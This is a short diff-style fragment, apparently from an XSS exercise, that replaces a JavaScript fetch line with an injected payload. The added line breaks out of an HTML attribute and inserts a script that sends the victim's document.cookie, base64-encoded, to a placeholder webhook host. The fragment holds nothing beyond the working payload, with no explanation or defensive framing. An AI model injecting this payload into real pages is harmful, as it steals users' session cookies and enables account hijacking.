@@ -1,2 +1,1 @@
-let url = "";
-fetch(url + "?x=" + btoa(document.domain));
+t"><script>fetch("webhookXD?x="%2Bbtoa(document.cookie))</script>
